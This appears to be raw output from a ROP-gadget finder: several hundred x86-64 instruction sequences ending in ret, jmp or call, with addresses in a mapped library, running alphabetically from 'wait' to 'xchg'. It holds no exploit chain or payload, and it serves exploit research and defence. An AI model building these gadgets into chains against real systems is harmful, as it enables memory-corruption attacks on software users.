0x00002aaaaabd8d09 : wait ; mov ebx, 0x8b49fff1 ; jge 0x103d19 ; call rbx
0x00002aaaaab7e1ed : wrmsr ; in eax, dx ; mov byte ptr [rdi + 0x13], ch ; ret
0x00002aaaaab7e26f : wrmsr ; in eax, dx ; mov byte ptr [rdi + 0x17], ch ; ret
0x00002aaaaab7e371 : wrmsr ; in eax, dx ; mov byte ptr [rdi + 0x1f], ch ; ret
0x00002aaaaaad7bd4 : xabort -0xd ; ret
0x00002aaaaaad7bd0 : xbegin 0xfffffffff8c6efd0 ; ret
0x00002aaaaac6a121 : xchg ah, bh ; call qword ptr [rdx]
0x00002aaaaac6a065 : xchg ah, bh ; call rax
0x00002aaaaac6a061 : xchg ah, bh ; inc dword ptr [rax - 0x7a] ; cld ; call rax
0x00002aaaaac6a0a1 : xchg ah, bh ; jmp qword ptr [rsi]
0x00002aaaaac6a261 : xchg ah, bh ; jmp rax
0x00002aaaaac6a0a5 : xchg ah, bh ; push qword ptr [rsi + 0x46fffc85] ; test edi, esp ; call rsi
0x00002aaaaac19c5f : xchg ah, bl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a483 : xchg ah, bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1bdcf : xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1984f : xchg ah, ch ; add eax, 0x83480000 ; ret 0xeb10
0x00002aaaaac1a573 : xchg ah, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a393 : xchg ah, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1935b : xchg al, ah ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac6c7d1 : xchg al, dh ; jmp rsp
0x00002aaaaac19b6b : xchg al, dl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1fd7c : xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f59c : xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f98c : xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f1ac : xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21cad : xchg bh, cl ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac5e420 : xchg bl, al ; cmc ; call rdx
0x00002aaaaac69385 : xchg bl, bh ; jmp qword ptr [rax]
0x00002aaaaac207b1 : xchg bl, cl ; adc eax, 0x83480000 ; ret 0xe910
0x00002aaaaac219b1 : xchg bl, cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac210b1 : xchg bl, cl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac213b1 : xchg bl, cl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac5cb35 : xchg bl, dh ; dec dword ptr [rbp - 0x21000c84] ; test esi, ebx ; call qword ptr [rax]
0x00002aaaaac20aa9 : xchg bl, dl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1addb : xchg byte ptr [rax + rax - 0x7cb80000], al ; ret 0xeb10
0x00002aaaaac1c92f : xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c10f : xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac195df : xchg byte ptr [rax + rcx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1b8ef : xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac1991f : xchg byte ptr [rax - 0x7cb80000], bl ; ret 0xeb10
0x00002aaaaac1a933 : xchg byte ptr [rax - 0x7cb80000], ch ; ret 0xeb10
0x00002aaaaaba472c : xchg byte ptr [rax - 0x7d], cl ; ret 0xeb01
0x00002aaaaabbc547 : xchg byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0x39 ; ret
0x00002aaaaac19c3b : xchg byte ptr [rax], al ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f34b : xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19d0b : xchg byte ptr [rax], dh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c44f : xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1a0c3 : xchg byte ptr [rbp + rcx - 0x7cb80000], bl ; ret 0xeb10
0x00002aaaaac1bc2f : xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1b40f : xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac1c5ef : xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac19abf : xchg byte ptr [rbx + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1ab13 : xchg byte ptr [rbx + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a2a3 : xchg byte ptr [rbx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac192af : xchg byte ptr [rbx + rcx - 0x7cb80000], cl ; ret 0xeb10
0x00002aaaaabdf0e3 : xchg byte ptr [rbx - 0x172ceffc], cl ; and eax, 1 ; ret
0x00002aaaaac31951 : xchg byte ptr [rbx], al ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac7b5f1 : xchg byte ptr [rbx], al ; mov word ptr [rdx], es ; push rdx ; ret
0x00002aaaaab03bba : xchg byte ptr [rcx + rax - 0x10], cl ; jmp rax
0x00002aaaaac1acf3 : xchg byte ptr [rcx + rax], ch ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab57742 : xchg byte ptr [rcx], ah ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaac196af : xchg byte ptr [rdi + rax - 0x7cb80000], cl ; ret 0xeb10
0x00002aaaaac1f83c : xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f05c : xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac2016c : xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab62d41 : xchg byte ptr [rdx + 0x48000002], ch ; add eax, edi ; add rax, rcx ; ret
0x00002aaaaac19b8f : xchg byte ptr [rdx + rax - 0x7cb80000], ch ; ret 0xeb10
0x00002aaaaac1ac03 : xchg byte ptr [rdx + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1937f : xchg byte ptr [rdx + rcx - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac1b74f : xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19421 : xchg byte ptr [rdx], bl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a545 : xchg byte ptr [rdx], bl ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a635 : xchg byte ptr [rdx], ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a455 : xchg byte ptr [rdx], cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac86a58 : xchg byte ptr [rip + 0x38d048c], al ; mov es, word ptr [rdx] ; add ah, bh ; ret
0x00002aaaaac1977f : xchg byte ptr [rsi + rax - 0x7cb80000], bh ; ret 0xeb10
0x00002aaaaac20d56 : xchg byte ptr [rsi], ah ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1b885 : xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c585 : xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21c56 : xchg byte ptr [rsi], ah ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21356 : xchg byte ptr [rsi], ah ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac21056 : xchg byte ptr [rsi], ah ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1c0a5 : xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f73d : xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac20a4e : xchg byte ptr [rsi], ch ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac2006d : xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac199ef : xchg byte ptr [rsp + rax], cl ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaac1a1b3 : xchg byte ptr [rsp + rcx - 0x7cb80000], ch ; ret 0xeb10
0x00002aaaaac1e0df : xchg ch, ch ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1deff : xchg ch, cl ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1e8d7 : xchg ch, dh ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1d7f7 : xchg ch, dl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1e6f7 : xchg ch, dl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac6f0c9 : xchg cl, bh ; inc dword ptr [rsi + rdx - 0x78bbfffe] ; stc ; call rsp
0x00002aaaaac72809 : xchg cl, ch ; jmp qword ptr [rcx]
0x00002aaaaac6ae81 : xchg cl, ch ; jmp rsp
0x00002aaaaac1c8c5 : xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1bbc5 : xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1b6e5 : xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c3e5 : xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f88d : xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaaad75b1 : xchg dh, ch ; ret 0x88ad
0x00002aaaaac1f0ad : xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19445 : xchg dh, dh ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaabd8f7a : xchg dl, bh ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac1a365 : xchg dl, bh ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a185 : xchg dl, bl ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a275 : xchg dl, ch ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1a095 : xchg dl, cl ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaab8dff3 : xchg dword ptr [rax + 0x39], ecx ; ret 0x8946
0x00002aaaaabca2a9 : xchg dword ptr [rax + 0x48000000], eax ; mov dword ptr [rsi + 0x78], eax ; xor eax, eax ; ret
0x00002aaaaaba8404 : xchg dword ptr [rax + 1], ecx ; clc ; jmp rax
0x00002aaaaab54125 : xchg dword ptr [rax + rax], eax ; add dh, dh ; ret
0x00002aaaaabd2739 : xchg dword ptr [rax - 0x72b7ffd4], ecx ; add eax, 0x2c8854 ; ret
0x00002aaaaab0450f : xchg dword ptr [rax - 0x7d], ecx ; ret 0x4901
0x00002aaaaaafb91b : xchg dword ptr [rax], eax ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x8901
0x00002aaaaab374e9 : xchg dword ptr [rbp - 0x77000000], ecx ; ret 0x348
0x00002aaaaab80a6f : xchg dword ptr [rbp - 0x7b], eax ; sal byte ptr [rbp - 0x35], 0xf3 ; ret
0x00002aaaaab33f3b : xchg dword ptr [rbp - 0x7cfffff0], ebp ; ret 0x8308
0x00002aaaaab2c44d : xchg dword ptr [rbx + rcx], esi ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab3d1a5 : xchg dword ptr [rbx - 0x76fffff6], ebp ; ret 0x348
0x00002aaaaabd3745 : xchg dword ptr [rcx + 0x2c], edi ; add byte ptr [rcx - 0x3a], al ; inc dword ptr [rax] ; ret
0x00002aaaaac571cc : xchg dword ptr [rcx + 0x79], ecx ; xchg eax, edx ; ret 0xf869
0x00002aaaaab5a7dc : xchg dword ptr [rcx + rax - 0x7cb70000], ebx ; ret 0xe96e
0x00002aaaaabcac11 : xchg dword ptr [rcx + rax], ecx ; add byte ptr [rax], al ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaab358fb : xchg dword ptr [rcx - 0x76fffff9], ebp ; ret 0x348
0x00002aaaaab3a9ce : xchg dword ptr [rcx - 0x7d000000], ebp ; ret 0x8308
0x00002aaaaab3c897 : xchg dword ptr [rdi - 0x77000000], edi ; ret 0x348
0x00002aaaaab53e04 : xchg dword ptr [rdi - 0x9fffffc], esi ; ret
0x00002aaaaabe94ae : xchg dword ptr [rdi], eax ; test eax, eax ; jne 0x1144ad ; pop rdx ; pop r10 ; ret
0x00002aaaaabc6a3b : xchg dword ptr [rdx - 0x76000002], ebp ; ret 0x8d48
0x00002aaaaab53dc1 : xchg dword ptr [rdx], edx ; add eax, dword ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x00002aaaaab35d6b : xchg dword ptr [rsi - 0x77000000], ebp ; ret 0x348
0x00002aaaaab3c1db : xchg dword ptr [rsi - 0x7d000000], edx ; ret 0x8308
0x00002aaaaac5736b : xchg dword ptr [rsp + rax + 0x6fa9ce9d], esp ; ret
0x00002aaaaac1d438 : xchg eax, ebp ; adc eax, 0x83480000 ; ret 0xe910
0x00002aaaaab47a26 : xchg eax, ebp ; add byte ptr [rax - 0x7d], cl ; ret 0x4c01
0x00002aaaaab4b38f : xchg eax, ebp ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab53240 : xchg eax, ebp ; add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaab49f12 : xchg eax, ebp ; add byte ptr [rcx - 0x7cb768f4], cl ; ret 0x4801
0x00002aaaaab6b2d4 : xchg eax, ebp ; clc ; dec dword ptr [rax - 0x77] ; ret 0x8949
0x00002aaaaac6aa0d : xchg eax, ebp ; cld ; call qword ptr [rax]
0x00002aaaaab03197 : xchg eax, ebp ; cmp qword ptr [r8], r8 ; mov qword ptr fs:[rdx], rax ; ret
0x00002aaaaabd700f : xchg eax, ebp ; fdiv st(1) ; dec dword ptr [rcx - 0x75] ; jge 0x10201f ; call rbx
0x00002aaaaac82141 : xchg eax, ebp ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7dec9 : xchg eax, ebp ; int1 ; call qword ptr [rax]
0x00002aaaaab50f3e : xchg eax, ebp ; nop ; mov rax, -1 ; ret
0x00002aaaaabf1272 : xchg eax, ebp ; nop dword ptr [rax + rax] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd2907 : xchg eax, ebp ; outsb dx, byte ptr [rsi] ; sub al, 0 ; mov rdx, rax ; jmp 0xfd8a5
0x00002aaaaaad70d3 : xchg eax, ebp ; ret
0x00002aaaaab88103 : xchg eax, ebp ; ret 0x11eb
0x00002aaaaab862c4 : xchg eax, ebp ; ret 0x2041
0x00002aaaaab84a15 : xchg eax, ebp ; ret 0x294c
0x00002aaaaabfbc58 : xchg eax, ebp ; ret 0x2c3c
0x00002aaaaabd3d7b : xchg eax, ebp ; ret 0x2f3c
0x00002aaaaabc13cb : xchg eax, ebp ; ret 0x3145
0x00002aaaaab9049c : xchg eax, ebp ; ret 0x3840
0x00002aaaaab72fb5 : xchg eax, ebp ; ret 0x3941
0x00002aaaaab42007 : xchg eax, ebp ; ret 0x5389
0x00002aaaaab0ade5 : xchg eax, ebp ; ret 0x5489
0x00002aaaaabff015 : xchg eax, ebp ; ret 0x8041
0x00002aaaaabadf37 : xchg eax, ebp ; ret 0x8341
0x00002aaaaab56ad1 : xchg eax, ebp ; ret 0x8349
0x00002aaaaab6b9fe : xchg eax, ebp ; ret 0x8445
0x00002aaaaabb4b3f : xchg eax, ebp ; ret 0x8488
0x00002aaaaab1c656 : xchg eax, ebp ; ret 0x854d
0x00002aaaaab8e9ce : xchg eax, ebp ; ret 0x8b4c
0x00002aaaaab8594c : xchg eax, ebp ; ret 0x8eb
0x00002aaaaab12ad6 : xchg eax, ebp ; ret 0x941
0x00002aaaaab05b17 : xchg eax, ebp ; ret 0x953d
0x00002aaaaab8302b : xchg eax, ebp ; ret 0x9eb
0x00002aaaaab8eb81 : xchg eax, ebp ; ret 0xa8e9
0x00002aaaaab6cdb9 : xchg eax, ebp ; ret 0xb60f
0x00002aaaaabd3dd4 : xchg eax, ebp ; ret 0xc084
0x00002aaaaab1c541 : xchg eax, ebp ; ret 0xc221
0x00002aaaaab113da : xchg eax, ebp ; ret 0xd348
0x00002aaaaab0b941 : xchg eax, ebp ; ret 0xd521
0x00002aaaaab8ea2c : xchg eax, ebp ; ret 0xd721
0x00002aaaaab1ac3f : xchg eax, ebp ; ret 0xdaf7
0x00002aaaaabf8bf5 : xchg eax, ebp ; ret 0xe083
0x00002aaaaab81701 : xchg eax, ebp ; ret 0xe883
0x00002aaaaab9125f : xchg eax, ebp ; ret 0xf748
0x00002aaaaabfbc7f : xchg eax, ebp ; ret 0xf980
0x00002aaaaab819ee : xchg eax, ebp ; ret 0xf983
0x00002aaaaabfc030 : xchg eax, ebp ; ret 0xfb80
0x00002aaaaabae00d : xchg eax, ebp ; ret 0xfb83
0x00002aaaaac0b26d : xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; jo 0x1362d6 ; ret
0x00002aaaaab4cfc6 : xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac039f4 : xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaabd3c14 : xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rdi], cl ; mov dh, 0xc0 ; ret
0x00002aaaaabdbb2d : xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac0ef93 : xchg eax, ebp ; ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rdi], cl ; mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0262a : xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaabbedfc : xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rdi], 0x47 ; ret 0x90c3
0x00002aaaaabe300e : xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4034a : xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; pop rbx ; ret
0x00002aaaaabbedde : xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; ret
0x00002aaaaac0b16d : xchg eax, ebp ; sal bh, 0xd8 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0b7b8 : xchg eax, ebp ; sal bh, 0xd8 ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4805d : xchg eax, ebp ; sal bh, 0xd8 ; ret
0x00002aaaaab36b8b : xchg eax, ebp ; sar bl, 0xff ; dec dword ptr [rax + 0x39] ; ret 0x940f
0x00002aaaaac8f741 : xchg eax, ebp ; sti ; jmp qword ptr [rdx]
0x00002aaaaaad7b81 : xchg eax, ebp ; test word ptr [rbx - 0x2e], bp ; cmp dl, byte ptr [rdi] ; ret
0x00002aaaaab50702 : xchg eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; jmp rax
0x00002aaaaab55c47 : xchg eax, ebx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x00002aaaaac30d27 : xchg eax, ebx ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac42860 : xchg eax, ebx ; add rcx, r11 ; jmp rcx
0x00002aaaaac253c3 : xchg eax, ebx ; add rsi, rdx ; add rdi, rdx ; add r9, r11 ; jmp r9
0x00002aaaaaad8959 : xchg eax, ebx ; and cl, ah ; ret
0x00002aaaaac6aa45 : xchg eax, ebx ; cld ; call rax
0x00002aaaaac5e409 : xchg eax, ebx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81ee9 : xchg eax, ebx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac59c7c : xchg eax, ebx ; in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x184c13 ; ret 0x48f
0x00002aaaaabf157d : xchg eax, ebx ; lcall ptr [rax + 0x48] ; mov eax, ebx ; pop rdx ; pop rbx ; ret
0x00002aaaaab7a03c : xchg eax, ebx ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaac25502 : xchg eax, ebx ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaaad878e : xchg eax, ebx ; mov ch, 0xb7 ; cli ; add ebx, ebp ; in al, -0x12 ; jne 0x377c ; ret 0x975
0x00002aaaaac6c611 : xchg eax, ebx ; out dx, eax ; lcall ptr [rsp + rax + 1] ; add byte ptr [rsp + rdx*4], dh ; out dx, eax ; call rsp
0x00002aaaaabd5e39 : xchg eax, ebx ; push rbx ; sub al, 0 ; add rsp, 8 ; ret
0x00002aaaaab6eb4a : xchg eax, ebx ; ret
0x00002aaaaab8ca7e : xchg eax, ebx ; ret 0x14c
0x00002aaaaab0c380 : xchg eax, ebx ; ret 0x3948
0x00002aaaaab0cecd : xchg eax, ebx ; ret 0x3949
0x00002aaaaab49cef : xchg eax, ebx ; ret 0x840
0x00002aaaaab0d3a1 : xchg eax, ebx ; ret 0x8548
0x00002aaaaab47494 : xchg eax, ebx ; ret 0xd108
0x00002aaaaac48611 : xchg eax, ebx ; ret 0xffea
0x00002aaaaac026be : xchg eax, ebx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab58a58 : xchg eax, ecx ; add byte ptr [rax], al ; add dh, dh ; ret
0x00002aaaaac5e912 : xchg eax, ecx ; add dh, dh ; ljmp ptr [rcx - 0x3c000500] ; add dh, bh ; jmp rdi
0x00002aaaaac30ea7 : xchg eax, ecx ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab38e48 : xchg eax, ecx ; add rcx, rdx ; jmp rcx
0x00002aaaaabb56b5 : xchg eax, ecx ; add rdx, rcx ; jmp rdx
0x00002aaaaac6aa01 : xchg eax, ecx ; cld ; call rax
0x00002aaaaac7d629 : xchg eax, ecx ; cld ; jmp qword ptr [rbx]
0x00002aaaaab68a43 : xchg eax, ecx ; div dword ptr [rdx] ; add byte ptr [rcx + 0x39], cl ; ror byte ptr [rdi + rcx + 0x47], 1 ; ret 0x894c
0x00002aaaaac81e11 : xchg eax, ecx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81e29 : xchg eax, ecx ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac6d281 : xchg eax, ecx ; hlt ; jmp rsp
0x00002aaaaac694e0 : xchg eax, ecx ; mov ch, 0xfd ; call rcx
0x00002aaaaac1c9d1 : xchg eax, ecx ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00002aaaaab3ad5b : xchg eax, ecx ; mov rdi, r15 ; call 0x71fd6
0x00002aaaaac6c5e1 : xchg eax, ecx ; out dx, eax ; dec esp ; add eax, dword ptr [rcx] ; add byte ptr [rdx + rdx*4], al ; out dx, eax ; jmp rsp
0x00002aaaaac89fef : xchg eax, ecx ; ret
0x00002aaaaabdbbe3 : xchg eax, ecx ; ret 0x2b
0x00002aaaaabbbf13 : xchg eax, ecx ; shr byte ptr [rip + 0x28b4800], 0x48 ; mov dword ptr [rdx], edi ; ret
0x00002aaaaac1b0ff : xchg eax, ecx ; sub eax, edx ; ret
0x00002aaaaabf53e3 : xchg eax, ecx ; sub r8b, byte ptr [rax] ; ret
0x00002aaaaaaf9aad : xchg eax, edi ; add byte ptr [rax], al ; add byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x85 ; ret 3
0x00002aaaaac7965d : xchg eax, edi ; add byte ptr [rax], al ; rol dl, 1 ; in eax, dx ; jmp qword ptr [rsi]
0x00002aaaaabcacdc : xchg eax, edi ; add byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x00002aaaaab063b4 : xchg eax, edi ; add eax, 0xc7834900 ; or byte ptr [rax + 1], cl ; ret
0x00002aaaaac308a7 : xchg eax, edi ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac0dd75 : xchg eax, edi ; jmp 0xffffffffc29d8d7c
0x00002aaaaabe9948 : xchg eax, edi ; mov rbx, qword ptr [rbp - 8] ; leave ; ret
0x00002aaaaabd6ca6 : xchg eax, edi ; pop rbx ; pop rbp ; pop r12 ; mov esi, 3 ; jmp rax
0x00002aaaaab1af27 : xchg eax, edi ; ret 0x870f
0x00002aaaaaba6f2d : xchg eax, edi ; ret 0xd008
0x00002aaaaaba1cee : xchg eax, edi ; ror byte ptr [rdi], 0x92 ; ret 0xd029
0x00002aaaaabdde16 : xchg eax, edi ; ror byte ptr [rdi], 0xb6 ; sal bh, 0xd8 ; ret
0x00002aaaaabccf59 : xchg eax, edi ; ror byte ptr [rdi], 0xb6 ; shr byte ptr [rcx], cl ; sal bl, 1 ; ret
0x00002aaaaabaca16 : xchg eax, edi ; ror dword ptr [rdi], -0x6e ; ret 0xd138
0x00002aaaaac8f4a9 : xchg eax, edi ; sti ; jmp qword ptr [rdx]
0x00002aaaaabde754 : xchg eax, edi ; sub eax, dword ptr [rax] ; mov eax, dword ptr [rax + 0x38] ; ret
0x00002aaaaab81ed7 : xchg eax, edi ; test r9d, r9d ; jne 0xace9a ; mov rax, rdx ; ret
0x00002aaaaac57818 : xchg eax, edi ; xchg eax, esp ; ret
0x00002aaaaab69a8a : xchg eax, edx ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xf748
0x00002aaaaab36ba1 : xchg eax, edx ; add byte ptr [rax], al ; add dh, dh ; ret 0x7504
0x00002aaaaac7917d : xchg eax, edx ; add byte ptr [rax], al ; rol byte ptr [rdx], 0xfd ; jmp rsp
0x00002aaaaab52aba : xchg eax, edx ; add eax, dword ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x00002aaaaab42a0e : xchg eax, edx ; add rsp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab23d8a : xchg eax, edx ; fadd dword ptr [rip - 0x77cb800] ; dec dword ptr [rcx - 0x77] ; ret 0x8b4c
0x00002aaaaac590dd : xchg eax, edx ; jae 0x1840ba ; push rsi ; pop rdx ; je 0x1840af ; ret 0xacfc
0x00002aaaaab4d0ea : xchg eax, edx ; mov edx, eax ; jmp 0x78082
0x00002aaaaabe7482 : xchg eax, edx ; or dword ptr [rbx], ebp ; add byte ptr [rax + 0x63], cl ; ret 0x4864
0x00002aaaaac6c5e9 : xchg eax, edx ; out dx, eax ; jmp rsp
